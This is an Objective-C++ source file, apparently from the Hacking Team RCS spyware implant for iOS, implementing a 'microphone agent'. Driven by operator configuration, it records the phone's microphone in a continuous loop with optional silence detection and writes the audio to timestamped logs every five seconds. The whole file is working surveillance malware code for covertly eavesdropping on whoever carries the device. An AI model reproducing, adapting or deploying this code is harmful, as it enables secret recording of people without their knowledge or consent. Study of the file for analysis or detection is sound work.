/*
 * RCSIAgentMicrophone.mm
 *  Microphone Agent - acts as a controller for the RCSIMicrophoneRecorder
 *
 *
 * Created on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSIAgentMicrophone.h"

//#define DEBUG

static int gFileCounter   = 0;
static int gThreadCounter = 0;
static NSLock *recorderLock;

@implementation _i_AgentMicrophone
@synthesize mRecorder;
@synthesize mIsRunning;
@synthesize mPlaybackWasInterrupted;

char *OSTypeToStr (char *buf, OSType t)
{
	char *p = buf;
	char str[4], *q = str;
	*(UInt32 *)str = CFSwapInt32 (t);
  
	for (int i = 0; i < 4; ++i)
    {
      if (isprint (*q) && *q != '\\')
        *p++ = *q++;
      else 
        {
          sprintf (p, "\\x%02x", *q++);
          p += 4;
        }
    }
  
	*p = '\0';
  
	return buf;
}

#pragma mark Log routines

- (void)generateLog
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [recorderLock lock];
  gThreadCounter += 1;
  [recorderLock unlock];

  if (mRecorder->getLoTimestamp()     == 0
      && mRecorder->getHiTimestamp()  == 0)
    {
      time_t unixTime;
      time(&unixTime);
      int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      
      int32_t hiTimestamp = (int64_t)filetime >> 32;
      int32_t loTimestamp = (int64_t)filetime & 0xFFFFFFFF;
      
      mRecorder->setLoTimestamp(loTimestamp);
      mRecorder->setHiTimestamp(hiTimestamp);
    }
  
  [recorderLock lock];
  int fileCounter = gFileCounter;
  gFileCounter    += 1;
  [recorderLock unlock];
  
  mRecorder->createLogForBufferedAudio(fileCounter);
  
  [recorderLock lock];
  gThreadCounter  -= 1;
  [recorderLock unlock];

  [outerPool release];
}

#pragma mark Recorder routines

- (void)stopRecord
{
  mRecorder->StopRecord();
  
  // now create a new queue for the recorded file
  //mRecordFilePath = (CFStringRef)[NSTemporaryDirectory() stringByAppendingPathComponent: @"micRecording.wav"];
}

- (void)startRecord
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (mRecorder->IsRunning() == FALSE)
    {
      // Start the recorder
      mRecorder->StartRecord();
    }
  
  [pool release];
}

#pragma mark AudioSession listeners
void interruptionListener2(	void *	inClientData,
                           UInt32	inInterruptionState)
{
	_i_AgentMicrophone *THIS = (_i_AgentMicrophone *)inClientData;
	if (inInterruptionState == kAudioSessionBeginInterruption)
    {
      if (THIS->mRecorder->IsRunning()) {
        [THIS stopRecord];
      }
    }
}

void propListener2 (void                    *inClientData,
                    AudioSessionPropertyID  inID,
                    UInt32                  inDataSize,
                    const void              *inData)
{
	_i_AgentMicrophone *THIS = (_i_AgentMicrophone *)inClientData;

	if (inID == kAudioSessionProperty_AudioRouteChange)
    {
      CFDictionaryRef routeDictionary = (CFDictionaryRef)inData;			
      
      CFNumberRef reason = (CFNumberRef)CFDictionaryGetValue(routeDictionary, CFSTR(kAudioSession_AudioRouteChangeKey_Reason));
      SInt32 reasonVal;
      CFNumberGetValue(reason, kCFNumberSInt32Type, &reasonVal);
      
      if (reasonVal != kAudioSessionRouteChangeReason_CategoryChange)
        {
          if (THIS->mRecorder->IsRunning())
            {
              [THIS stopRecord];
            }
        }	
    }
}

- (void)setupAudioQueue
{
  // Allocate our singleton instance for the recorder & player object
  mRecorder = new _i_MicrophoneRecorder();
  
  OSStatus error = AudioSessionInitialize(NULL, NULL, interruptionListener2, self);
  
  if (error == 0)
    {
      UInt32 category = kAudioSessionCategory_PlayAndRecord;	
      error = AudioSessionSetProperty(kAudioSessionProperty_AudioCategory, sizeof(category), &category);

      error = AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, propListener2, self);

      UInt32 inputAvailable = 0;
      UInt32 size = sizeof(inputAvailable);
      
      // we do not want to allow recording if input is not available
      error = AudioSessionGetProperty(kAudioSessionProperty_AudioInputAvailable, &size, &inputAvailable);
      
      // we also need to listen to see if input availability changes
      error = AudioSessionAddPropertyListener(kAudioSessionProperty_AudioInputAvailable, propListener2, self);

      error = AudioSessionSetActive(true); 
    }
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(playbackQueueStopped:)
                                               name: @"playbackQueueStopped"
                                             object: nil];
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(playbackQueueResumed:)
                                               name: @"playbackQueueResumed"
                                             object:nil];
}

# pragma mark Notification routines
- (void)playbackQueueStopped:(NSNotification *)note
{
#ifdef DEBUG
  NSLog(@"Playback queue stopped");
#endif
}

- (void)playbackQueueResumed:(NSNotification *)note
{

}

#pragma mark Cleanup

- (void)dealloc
{
	delete mRecorder;
	[recorderLock release];
	[super dealloc];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  int fileCounter;
  
  [recorderLock lock];
  int runningThreads = gThreadCounter;
  [recorderLock unlock];
  
  while (runningThreads > 0)
    {
      usleep(10000);
    }
  
  NSDate *micStartedDate = [NSDate date];
  NSTimeInterval interval = 0;

  [self setupAudioQueue];
  
  microphoneAgentStruct *microphoneRawData;
  microphoneRawData = (microphoneAgentStruct *)[mAgentConfiguration bytes];

  mRecorder->setVAD(microphoneRawData->detectSilence);
  mRecorder->setSilenceThreshold(microphoneRawData->silenceThreshold);
                                                
  [self setMAgentStatus: AGENT_STATUS_RUNNING];
                                                  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      [self startRecord];
      interval = [[NSDate date] timeIntervalSinceDate: micStartedDate];
      
      if (fabs(interval) >= 5)
        {
          [recorderLock lock];
          runningThreads = gThreadCounter;
          fileCounter    = gFileCounter;
          [recorderLock unlock];
          
          if (runningThreads >= 15)
            {
              [self stopRecord];
              while (gThreadCounter > 5)
                {
                  usleep(10000);
                }
            }
            
          [NSThread detachNewThreadSelector: @selector(generateLog)
                                   toTarget: self
                                 withObject: nil];

          micStartedDate = [[NSDate date] retain];
        }
        
      [innerPool drain];
      usleep(5000);
    }
      
  mIsRunning = FALSE;
  
  mRecorder->setLoTimestamp(0);
  mRecorder->setHiTimestamp(0);
  
  if (mRecorder->IsRunning())
    {
      [self stopRecord];
    }
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  while (1)
    {
      [recorderLock lock];
      int runningThreads = gThreadCounter;
      [recorderLock unlock];
      
      if (runningThreads == 0)
          break; 
      else
          usleep(10000);
    }
  
  [recorderLock lock];
  gFileCounter = 0;  
  [recorderLock unlock];
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  return YES;
}

- (BOOL)resume
{
  return TRUE;
}

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData *)aData
{
  self = [super initWithConfigData:aData];
  
  if (self != nil)
    {
      recorderLock = [[NSLock alloc] init];
      mAgentID     = AGENT_MICROPHONE;
    }
  
  return self;
}

@end
